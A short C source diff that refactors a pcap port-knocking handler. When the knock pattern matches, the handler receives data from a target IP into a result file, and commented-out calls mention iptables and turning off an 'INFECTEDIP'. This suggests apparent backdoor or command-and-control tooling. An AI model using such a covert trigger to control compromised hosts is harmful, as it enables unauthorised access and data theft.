@@ -73,18 +73,17 @@ void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* 
         size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 
         printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
-        for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
-            if(pattern[k] == tcp->th_dport){
-                knocking[k] = 1;
+        for(int k = 0; k < Filter.amount; k++){
+            if(Filter.port_ushort[k] == tcp->th_dport){
+                Filter.pattern[k] = 1;
             }
         }
         //fix this part
         if((Filter.pattern[0] == 1) && (Filter.pattern[1] == 1)){
             //system(IPTABLES(targetip,"tcp",PORT));
             char *dip = Filter.targetip;
-            unsigned short dport = (short)PORT;
             printf("WAITING FOR DATA\n");
-            recv_results(dip, dport, RESULT_FILE);
+            recv_results(dip, (short)PORT, RESULT_FILE);
             //system(TURNOFF(INFECTEDIP));
             pcap_breakloop(interfaceinfo);
         }
